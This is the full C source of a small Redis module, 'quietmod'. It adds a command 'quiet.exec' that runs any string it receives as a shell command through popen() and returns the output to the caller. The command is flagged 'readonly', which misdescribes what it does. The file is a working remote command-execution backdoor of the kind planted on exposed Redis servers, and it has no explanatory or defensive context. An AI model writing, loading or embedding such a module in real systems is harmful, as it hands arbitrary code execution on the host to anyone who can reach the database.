#include "redismodule.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static int QuietExec(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc != 2) return RedisModule_WrongArity(ctx);
    size_t len = 0;
    const char *s = RedisModule_StringPtrLen(argv[1], &len);
    char *cmd = malloc(len + 1);
    if (!cmd) return RedisModule_ReplyWithError(ctx, "ERR malloc");
    memcpy(cmd, s, len); cmd[len] = 0;
    FILE *p = popen(cmd, "r");
    free(cmd);
    if (!p) return RedisModule_ReplyWithError(ctx, "ERR popen");
    size_t cap=4096, n=0; char *out=malloc(cap);
    if (!out) { pclose(p); return RedisModule_ReplyWithError(ctx,"ERR malloc"); }
    for (;;) {
        if (n == cap) { cap *= 2; char *q=realloc(out,cap); if(!q) break; out=q; }
        size_t k=fread(out+n,1,cap-n,p); n+=k;
        if (k==0) break;
    }
    pclose(p);
    int rc=RedisModule_ReplyWithStringBuffer(ctx,out,n);
    free(out); return rc;
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx,"quietmod",1,REDISMODULE_APIVER_1)==REDISMODULE_ERR) return REDISMODULE_ERR;
    if (RedisModule_CreateCommand(ctx,"quiet.exec",QuietExec,"readonly",0,0,0)==REDISMODULE_ERR) return REDISMODULE_ERR;
    return REDISMODULE_OK;
}
